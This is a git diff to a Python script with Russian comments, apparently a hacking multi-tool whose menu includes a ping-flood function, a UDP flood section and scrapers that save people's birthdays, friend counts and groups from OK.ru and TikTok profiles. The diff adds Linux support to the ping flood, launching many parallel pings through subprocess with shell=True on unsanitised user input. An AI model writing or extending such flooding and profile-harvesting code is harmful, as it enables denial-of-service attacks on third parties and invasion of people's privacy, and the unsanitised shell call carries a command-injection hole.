@@ -19,16 +19,18 @@ from itertools import product
 import hashlib
 from telnetlib import Telnet
 from fake_useragent import UserAgent
+import subprocess
 
-#используется argparse для корректной работы с Windows и Linux
+#используется argparse для корректной работы с Windows и Linux. При отсутствии аргументов стандартно будет выбран Windows.
 parser = argparse.ArgumentParser()
 parser.add_argument ('-s', '--system', default='windows', help='Используйте флаг для того, чтобы выбрать систему. Стандартно выбрана Windows')
 args = parser.parse_args()
 
-init(autoreset=True)
+init(autoreset=True) #авторесет для colorama
 
-ua = UserAgent()
+ua = UserAgent() #переменная содержающая функцию библиотеки fake_useragent
 
+#ASCII ART
 def art():
     print(Fore.RED + '''
 
@@ -62,8 +64,15 @@ def checker(url):
 def ping(host):
     packets = input('Размер пакетов: ')
     threads = int(input('Количество потоков: '))
-    for i in range(threads):
-        os.system(f'start ping {host} -l {packets} -t')
+    system = args.system #получение аргументов
+    if system == 'windows':
+        for _ in range(threads):
+            os.system(f'start ping {host} -l {packets} -t')
+    elif system == 'linux':
+        for _ in range(threads):
+            process = subprocess.Popen(f'ping {host} -s {packets}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            command_output = process.stdout.read().decode('utf-8')
+            print(command_output)
 
 #tiktok parsing section
 def tiktokparsing(username):
@@ -142,9 +151,6 @@ def okparsing(url):
     if saveit == 'Y' or saveit == 'y':
         with open('OKdata.txt', 'w') as file:
             file.write(f'URL: {url}\nПользователь: {name.text}\nДата рождения: {birthday.text}\nКоличество друзей: {friends.text}\nКоличество групп: {groups.text}\nКоличество фотографий: {photo.text}\nКоличество игр: {games.text}')
-
-def new_func(soup):
-    living = soup.find('div', class_="user-profile_i_value ellip", attrs={"data-type": "TEXT"})
 
 #udp flood section
 def launchudp(ip, port, thread, t):
@@ -333,6 +339,7 @@ def clear():
 
 art()
 
+#запуск цикла с "командной" строкой
 while True:
     time.sleep(1.25)
     start = input(Colorate.Horizontal(Colors.purple_to_red, '''
@@ -360,7 +367,7 @@ while True:
         checker(url)
     if start == 'ping':
         clear()
-        host = input('Хост: ')
+        host = input('Хост (IP): ')
         ping(host)
     if start == 'okparser':
         clear()
